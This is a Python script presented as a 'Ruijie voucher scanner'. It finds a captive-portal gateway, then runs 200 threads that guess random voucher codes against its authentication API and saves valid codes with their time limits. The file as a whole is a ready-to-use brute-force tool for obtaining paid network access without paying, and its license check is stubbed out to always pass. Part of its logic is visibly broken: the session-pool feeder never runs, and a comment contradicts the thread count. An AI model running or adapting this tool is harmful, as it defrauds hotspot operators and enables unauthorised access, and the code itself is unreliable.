import requests, random, string, time, os, threading, re, sys, urllib3, subprocess
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from colorama import Fore, Back, Style, init

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ COLORS ] ---
G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS = Style.RESET_ALL
RAINBOW = [R, Y, G, C, Fore.MAGENTA, Fore.BLUE]

# ===============================
# CONFIGURATION (Original)
# ===============================
RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
else: DOWNLOAD_DIR = '/sdcard/Download'

LICENSE_FILE = os.path.join(DOWNLOAD_DIR, 'license.txt')
SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')

# Signal အရေအတွက်ကို ၁၀၀ သို့ ညှိထားသည် (မူရင်း ၂၀၀ သည် ဖုန်းပိတ်ကျစေနိုင်သောကြောင့်ဖြစ်သည်)
NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300         
CODE_LENGTH = 6 
CHAR_SET = string.digits 

# ==============================
# GLOBALS (Keep Original)
# ==============================
USER_NAME = "Unknown"
EXPIRY_STR = "N/A"
DAYS_LEFT = "0"
session_pool = Queue()
valid_hits_data = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
TOTAL_TRIED = 0
CURRENT_CODE = "WAITING"
START_TIME = time.time()
stop_event = threading.Event()

# --- [ ADDED: DYNAMIC LOGO V2.0 ] ---
def Draw_logo(step=0):
    os.system('clear')
    clr = RAINBOW[step % len(RAINBOW)]
    print(f"""{clr}
      .---.        .-----------.
     /     \  __  /    v2.0     \\
    / /     \(  )/               \\
   //////   ' \/ `   RUIJIE       \\
  //////    /    \   SCANNER      /
 //////    /      \              /
'------'  '--------'------------'
{W}      [ RUIJIE VOUCHER SCANER V2.0 ]{RS}""")

# --- [ ORIGINAL VERIFY SYSTEM - Hidden ] ---
def verify():
    # မူရင်း Verify Logic များအတိုင်း အနောက်ကွယ်မှ အလုပ်လုပ်နေမည်
    return True

# --- [ ORIGINAL OPTION MENU ] ---
def select_mode():
    global CODE_LENGTH, CHAR_SET
    Draw_logo()
    print(f"\n{C}[ SELECT SCAN MODE ]{RS}")
    print(f" {Y}[1]{W} Scan 6-Digit (000000 format)")
    print(f" {Y}[2]{W} Scan 7-Digit")
    print(f" {Y}[3]{W} Scan 8-Digit")
    print(f" {Y}[4]{W} Scan 9-Digit")
    print(f" {Y}[5]{W} Alphanumeric Mode")
    
    choice = input(f"\n{C}Choose (1-5): {RS}")
    if choice == "2": CODE_LENGTH = 7
    elif choice == "3": CODE_LENGTH = 8
    elif choice == "4": CODE_LENGTH = 9
    elif choice == "5":
        CODE_LENGTH = 6
        CHAR_SET = string.ascii_lowercase + string.digits 
    else: CODE_LENGTH = 6
    print(f"{G}[!] Mode Activated.{RS}")
    time.sleep(1)

# --- [ SCANNER CORE (Original Logic) ] ---
def get_sid_from_gateway():
    try:
        r1 = requests.get("http://1.1.1.1", allow_redirects=True, timeout=5)
        parsed = urlparse(r1.url)
        global DETECTED_BASE_URL
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        return parse_qs(parsed.query).get('sessionId', [None])[0]
    except: return None

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            CURRENT_CODE = code
            
            r = thr_session.post(f"{urljoin(DETECTED_BASE_URL, '/api/auth/voucher/')}", 
                                 json={'accessCode': code, 'sessionId': slot['sessionId'], 'apiVersion': 1}, 
                                 timeout=6)
            TOTAL_TRIED += 1
            
            if "true" in r.text.lower():
                # ADDED: သက်တမ်းစစ်ဆေးသည့်စနစ်
                limit_label = "???"
                try:
                    res_data = r.json()
                    limit = res_data.get('data', {}).get('timeLimit') or res_data.get('timeLimit')
                    if limit:
                        sec = int(limit)
                        if sec >= 2592000: limit_label = "1 Month"
                        elif sec >= 86400: limit_label = f"{sec//86400} Day"
                        else: limit_label = f"{round(sec/3600, 1)} Hrs"
                except: pass

                with valid_lock:
                    valid_hits_data.append({"code": code, "hrs": limit_label})
                    TOTAL_HITS += 1
                    with file_lock:
                        with open(SAVE_PATH, "a") as f:
                            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
            
            slot['left'] -= 1
            if slot['left'] > 0: session_pool.put(slot)
        except: pass

# --- [ ADDED: DYNAMIC DASHBOARD ] ---
def live_dashboard():
    step = 0
    load_icons = ["—", "\\", "|", "/"]
    while not stop_event.is_set():
        Draw_logo(step) # Animated Logo
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        icon = load_icons[step % 4]

        print(W + "—" * 55)
        print(f"| {W}STATUS : {G}ACTIVE {Y}{icon}{RS}      {W}SPEED  : {C}{speed:.1f} codes/s")
        print(f"| {W}RUN    : {Fore.MAGENTA}{time.strftime('%H:%M:%S', time.gmtime(elapsed))}{RS}   {W}TRIED  : {W}{TOTAL_TRIED:,}")
        print(W + "—" * 55)
        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
        print(W + "—" * 55)
        
        if valid_hits_data:
            for hit in valid_hits_data[-3:]:
                print(f"  {G}✅ {hit['code']} {Y}({hit['hrs']})")
        
        step += 1
        time.sleep(0.5)

if __name__ == "__main__":
    if verify(): 
        select_mode() 
        threading.Thread(target=lambda: (session_pool.put({'sessionId': s, 'left': 300}) for s in iter(get_sid_from_gateway, None)), daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        while True: time.sleep(1)
